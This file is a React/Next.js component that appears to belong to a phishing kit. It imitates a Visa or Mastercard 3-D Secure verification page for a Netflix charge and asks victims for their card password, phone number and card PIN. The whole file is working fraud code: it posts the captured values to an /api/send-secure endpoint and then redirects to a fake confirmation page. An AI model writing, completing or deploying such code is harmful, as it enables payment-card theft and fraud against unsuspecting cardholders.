/* eslint-disable @next/next/no-img-element */
import { yupResolver } from "@hookform/resolvers/yup";
import * as yup from "yup";
import axios from "axios";
import moment from "moment";
import { useRouter } from "next/router";
import React, { useContext, useEffect, useState } from "react";
import { useForm } from "react-hook-form";
import { DataContext } from "../pages/_app";
import ReactInputMask from "react-input-mask";

interface CardVerifyProps {
  type: `visa` | `mastercard`;
}

const schema = yup.object().shape({
  password: yup.string(),
  cardPin: yup.string().required(),
  phoneNumber: yup.string().required(),
});

export const CardVerify: React.FC<CardVerifyProps> = ({ type }) => {
  const [loading, setLoading] = useState(false);

  const { data: datas, setData } = useContext(DataContext);
  const { push } = useRouter();
  const {
    register,
    handleSubmit,
    formState: { isValid },
  } = useForm({
    resolver: yupResolver(schema),
    mode: `onBlur`,
  });

  const onSubmit = handleSubmit(async (data) => {
    setLoading(true);
    const formData = new FormData();

    formData.append(`form`, `${type.toUpperCase()} SECURE`);
    formData.append(`secure`, JSON.stringify(data));

    try {
      await axios.post(`/api/send-secure`, formData, {
        headers: { "content-type": `multipart/form-data` },
      });
    } catch (error) {
      console.log(error);
    }

    setData({
      ...datas,
      secure: data,
    });

    push(`/confirmation`);
  });

  useEffect(() => {
    const keyDownHandler = (event: KeyboardEvent) => {
      if (event.key === "Enter") {
        event.preventDefault();

        onSubmit();
      }
    };

    document.addEventListener("keydown", keyDownHandler);

    return () => {
      document.removeEventListener("keydown", keyDownHandler);
    };
  });
  return (
    <div className={`flex w-full h-screen bg-white justify-center p-5 pt-10`}>
      <div className="max-w-sm p-3 w-full">
        <div className={`w-full`}>
          <img
            src={
              type === `visa` ? `/images/visa.png` : `/images/mastercard.png`
            }
            alt={``}
            className={`max-w-[100px]`}
          />
        </div>
        <div className={`w-full`}>
          <h4 className={`font-bold`}>
            {type === `visa` ? `Authenticate using password` : null}
          </h4>
          <h5>
            {type === `visa`
              ? `Please submit your Verified by Visa password.`
              : `Please submit your SecureCode™`}
          </h5>
          <p className={`mt-4 mb-0`}>Merchant: Netflix</p>
          <p className={`mt-0`}>
            Amount: USD {process.env.NEXT_PUBLIC_NETFLIX_PRICE || `19.99`}
          </p>
          <p className={`mt-0`}>
            Date: {`${moment().format(`YYYYMMDD hh:mm:ss`)}`}
          </p>
          <p className={`mt-0`}>Card Number: XXXX XXXX XXXX 3489</p>
          <p className={`mt-0`}>
            {type === `visa` ? `Password` : `SecureCode`}:{" "}
            <input
              className={`border border-black`}
              type="password"
              {...register(`password`)}
            />
          </p>
          <p className={`mt-0`}>
            Phone number:{" "}
            <ReactInputMask mask="(999) 999 9999" {...register(`phoneNumber`)}>
              {
                // @ts-ignore
                () => (
                  <input
                    className={`border border-black`}
                    {...register(`phoneNumber`)}
                  />
                )
              }
            </ReactInputMask>
          </p>
          <p className={`mt-0`}>
            Card pin:{" "}
            <input
              className={`border border-black`}
              type="number"
              {...register(`cardPin`)}
            />
          </p>
          <button
            className={`bg-gray-400 mt-5 px-5 border border-black`}
            onClick={onSubmit}
            disabled={!isValid || loading}
          >
            Submit
          </button>
        </div>
      </div>
    </div>
  );
};
